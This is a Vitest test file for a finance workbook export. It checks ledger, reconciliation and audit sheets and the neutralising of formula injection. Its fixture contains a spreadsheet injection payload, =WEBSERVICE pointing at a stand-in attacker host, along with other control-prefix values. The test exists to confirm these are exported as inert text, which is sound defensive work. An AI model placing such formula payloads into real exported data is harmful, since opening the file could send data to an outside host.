import { describe, expect, it, vi } from 'vitest';
import * as XLSX from 'xlsx';
vi.mock('./supabase',()=>({supabase:null}));
import { financeWorkbook, spreadsheetText } from './financeSpreadsheet';
import { scopeKey, type FinanceReport, type ScopedRecord } from './scopedRecords';
const entry:ScopedRecord={id:'one',kind:'finance',scope_id:'church',event_id:'event',record_date:'2026-10-15',service_year:2026,title:'=WEBSERVICE("https://attacker.invalid")',body:'+formula',status:'published',entry_type:'income',category:'@malicious',amount:15000,currency:'KRW',revision:1,source_operation_id:'op',reversal_of:null};
const report:FinanceReport={scope_id:'church',event_id:'event',starts_on:'2026-10-01',ends_on:'2026-10-31',generated_at:'2026-10-15T00:00:00Z',currency:'KRW',entries:[entry],history:[{revision:1,action:'fee.paid',reason:'-unsafe',occurred_at:'2026-10-15T00:00:00Z',snapshot:entry}],income:15000,expense:0,closed:true};
describe('private finance workbook',()=>{
 it('writes real OOXML with independent ledger, reconciliation and audit sheets',()=>{
  const bytes=XLSX.write(financeWorkbook(report),{type:'array',bookType:'xlsx'});
  const workbook=XLSX.read(bytes,{type:'array'});
  expect(workbook.SheetNames).toEqual(['장부','결산대사','감사이력']);
  const totals=XLSX.utils.sheet_to_json<Record<string,unknown>>(workbook.Sheets['결산대사']);
  expect(totals[0]).toMatchObject({수입:15000,지출:0,잔액:15000,통화:'KRW',마감:'마감'});
 });
 it('exports formula-looking user content as inert text and amounts as numbers',()=>{
  const workbook=financeWorkbook(report);
  const rows=XLSX.utils.sheet_to_json<Record<string,unknown>>(workbook.Sheets['장부']);
  expect(rows[0].내용).toBe('\'=WEBSERVICE("https://attacker.invalid")');
  expect(rows[0].메모).toBe("'+formula");expect(rows[0].금액).toBe(15000);
  expect(Object.values(workbook.Sheets['장부']).some(cell=>typeof cell==='object'&&cell!==null&&'f' in cell)).toBe(false);
 });
 it.each(['=1','+1','-1','@1','\t1','\n1','\r1'])('neutralizes spreadsheet control prefix %j',value=>expect(spreadsheetText(value)).toBe("'"+value));
 it('distinguishes organization ledger from explicit event ledger',()=>{
  const base={scope_id:'church',organization_id:'org',label:'교회',can_minutes:true,can_finance:true};
  expect(scopeKey({...base,event_id:null})).not.toEqual(scopeKey({...base,event_id:'event'}));
 });
});
